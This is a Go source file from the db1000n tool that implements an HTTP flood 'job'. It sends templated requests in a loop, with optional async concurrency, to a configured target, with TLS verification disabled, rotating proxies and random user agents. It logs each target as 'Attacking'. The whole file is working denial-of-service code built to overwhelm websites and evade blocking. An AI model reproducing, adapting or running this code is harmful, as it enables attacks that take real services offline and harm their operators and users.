package jobs

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"text/template"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func httpJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	type httpJobConfig struct {
		BasicJobConfig
		Path    string
		Method  string
		Body    json.RawMessage
		Headers map[string]string
		Client  json.RawMessage // See HTTPClientConfig
	}

	var jobConfig httpJobConfig
	if err := json.Unmarshal(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config json: %v", err)
		return err
	}

	type HTTPClientConfig struct {
		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
		Timeout         *time.Duration `json:"timeout"`
		MaxIdleConns    *int           `json:"max_idle_connections"`
		ProxyURLs       string         `json:"proxy_urls"`
		Async           bool           `json:"async"`
	}

	var clientConfig HTTPClientConfig
	if err := json.Unmarshal([]byte(templates.ParseAndExecute(string(jobConfig.Client))), &clientConfig); err != nil && debug {
		log.Printf("Failed to parse job client json, ignoring: %v", err)
	}

	timeout := time.Second * 90
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	var proxy func(r *http.Request) (*url.URL, error)
	if len(clientConfig.ProxyURLs) > 0 {
		log.Printf("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)

		var proxyURLs []string

		if err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs); err == nil {
			if debug {
				log.Printf("proxyURLs: %v", proxyURLs)
			}

			// Return random proxy from the list
			proxy = func(r *http.Request) (*url.URL, error) {
				if len(proxyURLs) == 0 {
					return nil, errors.New("proxylist is empty")
				}

				proxyString := proxyURLs[rand.Intn(len(proxyURLs))]

				u, err := url.Parse(proxyString)
				if err != nil {
					if u, err = url.Parse(r.URL.Scheme + proxyString); err != nil && debug {
						log.Printf("Failed to parse proxy, sending request directly: %v", err)
					}
				}

				return u, nil
			}
		} else if debug {
			log.Printf("Failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
		}
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
			Dial: (&net.Dialer{
				Timeout:   timeout,
				KeepAlive: timeout,
			}).Dial,
			MaxIdleConns:          maxIdleConns,
			IdleConnTimeout:       timeout,
			TLSHandshakeTimeout:   timeout,
			ExpectContinueTimeout: timeout,
			Proxy:                 proxy,
		},
		Timeout: timeout,
	}

	methodTpl, pathTpl, bodyTpl, headerTpls, err := parseHTTPRequestTemplates(
		jobConfig.Method, jobConfig.Path, string(jobConfig.Body), jobConfig.Headers)
	if err != nil {
		return err
	}

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for jobConfig.Next(ctx) {
		method, path, body := templates.Execute(methodTpl), templates.Execute(pathTpl), templates.Execute(bodyTpl)
		dataSize := len(method) + len(path) + len(body) // Rough uploaded data size for reporting

		req, err := http.NewRequest(method, path, bytes.NewReader([]byte(body)))
		if err != nil {
			if debug {
				log.Printf("error creating request: %v", err)
			}

			continue
		}

		select {
		case <-ticker.C:
			log.Printf("Attacking %v", jobConfig.Path)
		default:
		}

		// Add random user agent and configured headers
		req.Header.Set("user-agent", uarand.GetRandom())
		for keyTpl, valueTpl := range headerTpls {
			key, value := templates.Execute(keyTpl), templates.Execute(valueTpl)
			req.Header.Add(key, value)
			dataSize += len(key) + len(value)
		}

		if clientConfig.Async {
			go sendRequest(client, req, debug)
		} else {
			sendRequest(client, req, debug)
		}

		trafficMonitor.Add(dataSize)

		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}

	return nil
}

func sendRequest(client *http.Client, req *http.Request, debug bool) {
	if debug {
		log.Printf("%s %s started at %d", req.Method, req.RequestURI, time.Now().Unix())
	}

	resp, err := client.Do(req)
	if err != nil {
		if debug {
			log.Printf("Error sending request %v: %v", req, err)
		}

		return
	}

	resp.Body.Close() // No need for response

	if debug {
		if resp.StatusCode >= http.StatusBadRequest {
			log.Printf("%s %s failed at %d with code %d", req.Method, req.RequestURI, time.Now().Unix(), resp.StatusCode)
		} else {
			log.Printf("%s %s finished at %d", req.Method, req.RequestURI, time.Now().Unix())
		}
	}
}

func parseHTTPRequestTemplates(method, path, body string, headers map[string]string) (
	methodTpl, pathTpl, bodyTpl *template.Template, headerTpls map[*template.Template]*template.Template, err error) {
	if methodTpl, err = templates.Parse(method); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing method template: %v", err)
	}

	if pathTpl, err = templates.Parse(path); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing path template: %v", err)
	}

	if bodyTpl, err = templates.Parse(body); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing body template: %v", err)
	}

	headerTpls = make(map[*template.Template]*template.Template, len(headers))
	for key, value := range headers {
		keyTpl, err := templates.Parse(key)
		if err != nil {
			return nil, nil, nil, nil, fmt.Errorf("error parsing header key template %q: %v", key, err)
		}

		valueTpl, err := templates.Parse(value)
		if err != nil {
			return nil, nil, nil, nil, fmt.Errorf("error parsing header value template %q: %v", value, err)
		}

		headerTpls[keyTpl] = valueTpl
	}

	return methodTpl, pathTpl, bodyTpl, headerTpls, nil
}
